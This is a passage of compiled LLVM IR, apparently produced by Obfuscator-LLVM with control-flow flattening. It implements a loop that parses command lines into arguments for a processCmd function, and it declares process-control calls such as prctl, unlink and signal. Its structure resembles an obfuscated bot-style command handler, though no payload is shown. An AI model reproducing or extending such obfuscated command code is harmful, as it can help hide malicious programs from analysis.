  %228 = load i8*, i8** %18, align 8
  %229 = call i64 @strlen(i8* %228) #9
  %230 = getelementptr inbounds i8, i8* %227, i64 %229
  %231 = getelementptr inbounds i8, i8* %230, i64 2
  store i8* %231, i8** %17, align 8
  store i32 1107224454, i32* %switchVar
  br label %loopEnd

; <label>:232:                                    ; preds = %loopEntry
  %233 = load i8*, i8** %17, align 8
  %234 = load i8*, i8** %17, align 8
  %235 = call i64 @strlen(i8* %234) #9
  %236 = sub i64 %235, 1
  %237 = getelementptr inbounds i8, i8* %233, i64 %236
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp eq i32 %239, 10
  %241 = select i1 %240, i32 387629105, i32 -2037004023
  store i32 %241, i32* %switchVar
  store i1 true, i1* %.reg2mem5
  br label %loopEnd

; <label>:242:                                    ; preds = %loopEntry
  %243 = load i8*, i8** %17, align 8
  %244 = load i8*, i8** %17, align 8
  %245 = call i64 @strlen(i8* %244) #9
  %246 = sub i64 %245, 1
  %247 = getelementptr inbounds i8, i8* %243, i64 %246
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 13
  store i32 387629105, i32* %switchVar
  store i1 %250, i1* %.reg2mem5
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %.reload6 = load i1, i1* %.reg2mem5
  %252 = select i1 %.reload6, i32 -2074422500, i32 -1229216638
  store i32 %252, i32* %switchVar
  br label %loopEnd

; <label>:253:                                    ; preds = %loopEntry
  %254 = load i8*, i8** %17, align 8
  %255 = load i8*, i8** %17, align 8
  %256 = call i64 @strlen(i8* %255) #9
  %257 = sub i64 %256, 1
  %258 = getelementptr inbounds i8, i8* %254, i64 %257
  store i8 0, i8* %258, align 1
  store i32 1107224454, i32* %switchVar
  br label %loopEnd

; <label>:259:                                    ; preds = %loopEntry
  %260 = load i8*, i8** %17, align 8
  store i8* %260, i8** %19, align 8
  store i32 -983682801, i32* %switchVar
  br label %loopEnd

; <label>:261:                                    ; preds = %loopEntry
  %262 = load i8*, i8** %17, align 8
  %263 = load i8, i8* %262, align 1
  %264 = zext i8 %263 to i32
  %265 = icmp ne i32 %264, 32
  %266 = select i1 %265, i32 1091283592, i32 -1166747745
  store i32 %266, i32* %switchVar
  store i1 false, i1* %.reg2mem7
  br label %loopEnd

; <label>:267:                                    ; preds = %loopEntry
  %268 = load i8*, i8** %17, align 8
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp ne i32 %270, 0
  store i32 -1166747745, i32* %switchVar
  store i1 %271, i1* %.reg2mem7
  br label %loopEnd

; <label>:272:                                    ; preds = %loopEntry
  %.reload8 = load i1, i1* %.reg2mem7
  %273 = select i1 %.reload8, i32 1610551668, i32 1493157906
  store i32 %273, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  %275 = load i8*, i8** %17, align 8
  %276 = getelementptr inbounds i8, i8* %275, i32 1
  store i8* %276, i8** %17, align 8
  store i32 -983682801, i32* %switchVar
  br label %loopEnd

; <label>:277:                                    ; preds = %loopEntry
  %278 = load i8*, i8** %17, align 8
  store i8 0, i8* %278, align 1
  %279 = load i8*, i8** %17, align 8
  %280 = getelementptr inbounds i8, i8* %279, i32 1
  store i8* %280, i8** %17, align 8
  %281 = load i8*, i8** %19, align 8
  store i8* %281, i8** %20, align 8
  store i32 -393595543, i32* %switchVar
  br label %loopEnd

; <label>:282:                                    ; preds = %loopEntry
  %283 = load i8*, i8** %20, align 8
  %284 = load i8, i8* %283, align 1
  %285 = icmp ne i8 %284, 0
  %286 = select i1 %285, i32 -1358087798, i32 1686201008
  store i32 %286, i32* %switchVar
  br label %loopEnd

; <label>:287:                                    ; preds = %loopEntry
  %288 = load i8*, i8** %20, align 8
  %289 = load i8, i8* %288, align 1
  %290 = zext i8 %289 to i32
  %291 = call i32 @toupper(i32 %290) #9
  %292 = trunc i32 %291 to i8
  %293 = load i8*, i8** %20, align 8
  store i8 %292, i8* %293, align 1
  %294 = load i8*, i8** %20, align 8
  %295 = getelementptr inbounds i8, i8* %294, i32 1
  store i8* %295, i8** %20, align 8
  store i32 -393595543, i32* %switchVar
  br label %loopEnd

; <label>:296:                                    ; preds = %loopEntry
  store i32 1, i32* %22, align 4
  %297 = load i8*, i8** %17, align 8
  %298 = call i8* @strtok(i8* %297, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0)) #3
  store i8* %298, i8** %23, align 8
  %299 = load i8*, i8** %19, align 8
  %300 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 0
  store i8* %299, i8** %300, align 16
  store i32 156173017, i32* %switchVar
  br label %loopEnd

; <label>:301:                                    ; preds = %loopEntry
  %302 = load i8*, i8** %23, align 8
  %303 = icmp ne i8* %302, null
  %304 = select i1 %303, i32 -285300511, i32 -1763603420
  store i32 %304, i32* %switchVar
  br label %loopEnd

; <label>:305:                                    ; preds = %loopEntry
  %306 = load i8*, i8** %23, align 8
  %307 = load i8, i8* %306, align 1
  %308 = zext i8 %307 to i32
  %309 = icmp ne i32 %308, 10
  %310 = select i1 %309, i32 1920616238, i32 -1480611418
  store i32 %310, i32* %switchVar
  br label %loopEnd

; <label>:311:                                    ; preds = %loopEntry
  %312 = load i8*, i8** %23, align 8
  %313 = call i64 @strlen(i8* %312) #9
  %314 = add i64 %313, 1
  %315 = call noalias i8* @malloc(i64 %314) #3
  %316 = load i32, i32* %22, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %317
  store i8* %315, i8** %318, align 8
  %319 = load i32, i32* %22, align 4
  %320 = sext i32 %319 to i64
  %321 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %320
  %322 = load i8*, i8** %321, align 8
  %323 = load i8*, i8** %23, align 8
  %324 = call i64 @strlen(i8* %323) #9
  %325 = add i64 %324, 1
  call void @llvm.memset.p0i8.i64(i8* %322, i8 0, i64 %325, i32 1, i1 false)
  %326 = load i32, i32* %22, align 4
  %327 = sext i32 %326 to i64
  %328 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %327
  %329 = load i8*, i8** %328, align 8
  %330 = load i8*, i8** %23, align 8
  %331 = call i8* @strcpy(i8* %329, i8* %330) #3
  %332 = load i32, i32* %22, align 4
  %333 = add nsw i32 %332, 1
  store i32 %333, i32* %22, align 4
  store i32 -1480611418, i32* %switchVar
  br label %loopEnd

; <label>:334:                                    ; preds = %loopEntry
  %335 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.143, i32 0, i32 0)) #3
  store i8* %335, i8** %23, align 8
  store i32 156173017, i32* %switchVar
  br label %loopEnd

; <label>:336:                                    ; preds = %loopEntry
  %337 = load i32, i32* %22, align 4
  %338 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i32 0, i32 0
  call void @processCmd(i32 %337, i8** %338)
  %339 = load i32, i32* %22, align 4
  %340 = icmp sgt i32 %339, 1
  %341 = select i1 %340, i32 -1102054052, i32 1510142045
  store i32 %341, i32* %switchVar
  br label %loopEnd

; <label>:342:                                    ; preds = %loopEntry
  store i32 1, i32* %24, align 4
  store i32 1, i32* %24, align 4
  store i32 1371527457, i32* %switchVar
  br label %loopEnd

; <label>:343:                                    ; preds = %loopEntry
  %344 = load i32, i32* %24, align 4
  %345 = load i32, i32* %22, align 4
  %346 = icmp slt i32 %344, %345
  %347 = select i1 %346, i32 -83508572, i32 -912321965
  store i32 %347, i32* %switchVar
  br label %loopEnd

; <label>:348:                                    ; preds = %loopEntry
  %349 = load i32, i32* %24, align 4
  %350 = sext i32 %349 to i64
  %351 = getelementptr inbounds [10 x i8*], [10 x i8*]* %21, i64 0, i64 %350
  %352 = load i8*, i8** %351, align 8
  call void @free(i8* %352) #3
  store i32 -1009571068, i32* %switchVar
  br label %loopEnd

; <label>:353:                                    ; preds = %loopEntry
  %354 = load i32, i32* %24, align 4
  %355 = add nsw i32 %354, 1
  store i32 %355, i32* %24, align 4
  store i32 1371527457, i32* %switchVar
  br label %loopEnd

; <label>:356:                                    ; preds = %loopEntry
  store i32 1510142045, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  store i32 749581640, i32* %switchVar
  br label %loopEnd

; <label>:358:                                    ; preds = %loopEntry
  store i32 -1097849363, i32* %switchVar
  br label %loopEnd

; <label>:359:                                    ; preds = %loopEntry
  store i32 -690614907, i32* %switchVar
  br label %loopEnd

; <label>:360:                                    ; preds = %loopEntry
  %361 = load i32, i32* %3, align 4
  ret i32 %361

loopEnd:                                          ; preds = %359, %358, %357, %356, %353, %348, %343, %342, %336, %334, %311, %305, %301, %296, %287, %282, %277, %274, %272, %267, %261, %259, %253, %251, %242, %232, %223, %222, %216, %213, %211, %206, %200, %197, %186, %183, %182, %178, %175, %165, %159, %146, %143, %132, %126, %123, %114, %108, %107, %101, %93, %92, %88, %85, %84, %83, %82, %81, %80, %79, %75, %70, %66, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @unlink(i8*) #1

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) #1

declare i32 @waitpid(i32, i32*, i32) #2

; Function Attrs: nounwind
declare i32 @chdir(i8*) #1

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #1

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn nounwind }
attributes #12 = { noreturn }

!llvm.ident = !{!0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146535865}
!2 = !{i32 -2146535174}
!3 = !{i32 -2146534425}
!4 = !{i32 -2146533715}
!5 = !{i32 -2146532897}
!6 = !{i32 -2146532006}
